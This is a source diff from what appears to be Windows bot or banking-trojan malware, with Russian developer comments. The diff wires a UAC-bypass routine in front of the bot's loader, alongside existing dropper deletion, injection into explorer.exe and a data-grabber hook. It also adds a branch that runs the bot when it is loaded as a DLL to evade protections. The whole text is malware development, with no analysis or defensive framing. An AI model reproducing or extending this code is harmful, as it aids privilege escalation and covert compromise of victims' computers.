@@ -20,6 +20,8 @@
 #include "BotDef.h"
 #include "DbgRpt.h"
 #include "Modules.h"
+#include "Exploit\\UAC_bypass.h"
+#include "Main.h"
 #include "StrConsts.h"
 
 
@@ -122,6 +124,13 @@ void DeleteDropper() // убиваем процесс, стираем файл
 		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
 		pDeleteFileW(FileToDelete);
 	}
+}
+
+bool RunLoaderRoutine()
+{
+	if( !RunBotBypassUAC(0) )
+		return MegaJump( LoaderRoutine );
+	return true;
 }
 
 DWORD WINAPI LoaderRoutine( LPVOID lpData )
@@ -251,7 +260,11 @@ void ExplorerMain()
 	//----------------------------------------------------
 
 	if ( !dwAlreadyRun )
-		MegaJump( LoaderRoutine );
+	{
+		RunLoaderRoutine();
+		//MegaJump( LoaderRoutine );
+		//RunBotBypassUAC(0);
+	}
 	
 	#ifdef GrabberH
 		if ( dwFirst && !dwGrabberRun )
@@ -279,10 +292,7 @@ void ExplorerMain()
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 
-	BOT::Initialize();
-
-	UnhookDlls();
-
+	BOT::InitializeApi();
 	
 	if (dwExplorerSelf) 
 	{
@@ -299,10 +309,39 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 	return 0;
 }
 
+/*
+DWORD WINAPI RunFromDll(void*)
+{
+	BOT::Initialize();
+	DWORD pid = GetUniquePID();
+	MDBG( "DllBot", "Запустили из dll pid=%d", pid );
+	pWinExec( "regedit.exe", SW_SHOW );
+	int err = pGetLastError();
+	while(1)
+	{
+		Sleep(5000);
+		MDBG( "DllBot", "work %d,%d", pid, err );
+	}
+	return 0;
+}
+*/
 
 int APIENTRY MyMain() 
 {
 	BOT::Initialize();   
+
+	DWORD image = GetImageBase();
+    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)
+        ((PUCHAR)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
+	if( headers->FileHeader.Characteristics & IMAGE_FILE_DLL )
+	{
+		//exe бота запущен как dll, такое может быть при обходе различных защит
+		MDBG( "Main", "Запустили как DLL" );
+		MegaJump(LoaderRoutine);
+		pExitProcess(UAC_BYPASS_MAGIC_RETURN_CODE);
+		return 0;
+	}
+
 
 	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
 	
@@ -363,7 +402,7 @@ int APIENTRY MyMain()
 
 		if ( !dwExploits )
 		{
-			if ( MegaJump( LoaderRoutine ) )
+			if ( RunLoaderRoutine() /*MegaJump( LoaderRoutine )*/ )
 			{
 				dwAlreadyRun = 1;
 			}
@@ -377,7 +416,7 @@ int APIENTRY MyMain()
 
 			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
 			{
-				MegaJump( LoaderRoutine );
+				RunLoaderRoutine(); //MegaJump( LoaderRoutine );
 			}
 		}		
 	}
@@ -391,7 +430,7 @@ int APIENTRY MyMain()
 
 		if ( !dwExploits )
 		{
-			if (MegaJump(LoaderRoutine))
+			if ( RunLoaderRoutine() /*MegaJump(LoaderRoutine)*/)
 			{
 				dwAlreadyRun = 1;
 			}
